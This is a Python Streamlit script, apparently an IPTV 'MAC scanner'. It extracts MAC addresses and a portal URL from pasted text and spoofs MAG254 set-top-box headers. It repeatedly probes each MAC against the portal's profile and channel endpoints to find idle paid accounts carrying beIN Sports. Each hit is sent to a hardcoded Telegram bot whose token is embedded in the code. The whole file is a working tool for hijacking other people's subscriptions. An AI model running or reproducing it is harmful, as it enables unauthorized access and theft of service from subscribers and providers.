import streamlit as st
import requests
import time
import telebot
import random
import re

# بياناتك الثابتة
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الكلمات المفتاحية للقنوات المطلوبة
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# إعداد الصفحة
st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡")
st.markdown("<h1 style='text-align: center; color: #FF4B4B;'>📡 Radar Ayoub Hammami Pro</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; font-weight: bold;'>نظام المسح الذكي وحالة السيرفر المباشرة</p>", unsafe_allow_html=True)

# صندوق إدخال البيانات
raw_data = st.text_area("انسخ هنا النص العشوائي (روابط وماكات مبعثرة)", height=150)

def check_server_health(url):
    """وظيفة للتحقق من أن السيرفر يعمل"""
    try:
        response = requests.get(url, timeout=10)
        return True, response.status_code
    except:
        return False, "OFFLINE"

if st.button("🚀 بدء المسح الشامل"):
    if raw_data:
        # استخراج الماكات والرابط بذكاء
        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
        
        if host_match and macs:
            full_url = host_match.group(0).split('/portal.php')[0].strip('/')
            clean_host = full_url.replace("http://", "").replace("https://", "").split('/')[0]
            
            # --- فحص حالة السيرفر أولاً ---
            st.info(f"🔍 يتم الآن فحص استجابة السيرفر: {full_url}")
            is_alive, status_code = check_server_health(f"{full_url}/portal.php")
            
            if is_alive:
                st.success(f"🟢 حالة السيرفر: يعمل (Status: {status_code})")
                st.write(f"🌐 **URL المستهدف:** `{full_url}/portal.php`")
                st.write(f"🎯 **الأهداف المستخرجة:** `{len(macs)}` ماك")
                
                col1, col2, col3 = st.columns(3)
                stat_total = col1.metric("إجمالي الأهداف", len(macs))
                stat_checked = col2.empty()
                stat_found = col3.empty()
                
                found_count = 0
                checked_count = 0
                
                try:
                    bot.send_message(ID, f"📡 **Radar Ayoub Hammami**\n\n✅ السيرفر يعمل: `{status_code}`\n🌐 `{clean_host}`\n📦 عدد الأهداف: {len(macs)}")
                except:
                    pass

                placeholder = st.empty()
                
                while True:
                    temp_checked = 0
                    for current_mac in macs:
                        temp_checked += 1
                        checked_count += 1
                        
                        stat_checked.metric("إجمالي الفحوصات", checked_count)
                        stat_found.metric("الصيد الذهبي", found_count)
                        
                        placeholder.info(f"🔎 يفحص الآن ({temp_checked}/{len(macs)}): {current_mac}")
                        
                        headers = {
                            'User-Agent': 'MAG254',
                            'Cookie': f'mac={current_mac}',
                            'X-User-Agent': 'Model: MAG254; Link: WiFi'
                        }
                        base_url = f"{full_url}/portal.php"
                        
                        try:
                            url_prof = f"{base_url}?type=stb&action=get_profile&force_stb=1"
                            start = time.time()
                            r_prof = requests.get(url_prof, headers=headers, timeout=7)
                            latency = (time.time() - start) * 1000
                            
                            if r_prof.status_code == 200:
                                match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r_prof.text)
                                active = match.group(1) if match else "0"

                                if active == "0":
                                    found_count += 1
                                    url_ch = f"{base_url}?type=itv&action=get_all_channels"
                                    r_ch = requests.get(url_ch, headers=headers, timeout=7)
                                    ch_text = r_ch.text.upper()
                                    
                                    found_channels = [f"✅ {n}" for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
                                    
                                    alert = (
                                        f"🎯 **صيد متاح بواسطة Radar Ayoub**\n\n"
                                        f"🌐 السيرفر: `{clean_host}`\n"
                                        f"🖥️ الماك: `{current_mac}`\n"
                                        f"📊 الاستجابة: `{int(latency)}ms`\n"
                                        f"👥 المتصلون: `0`\n"
                                        f"📺 القنوات:\n" + ("\n".join(found_channels) if found_channels else "❌ القنوات المفضلة غير متاحة") +
                                        f"\n\n👤 المالك: Ayoub Hammami"
                                    )
                                    bot.send_message(ID, alert, parse_mode="Markdown")
                                    st.toast(f"✅ تم صيد ماك متاح: {current_mac}")
                        except:
                            pass
                        
                        time.sleep(1.2)

                    placeholder.warning("🔄 انتهت الدورة.. إعادة المسح التلقائي...")
                    time.sleep(10)
            else:
                st.error(f"🔴 السيرفر لا يستجيب أو الرابط غير صحيح. الكود: {status_code}")
        else:
            st.error("❌ لم يتم العثور على رابط أو ماكات.")
    else:
        st.warning("⚠️ الصندوق فارغ!")

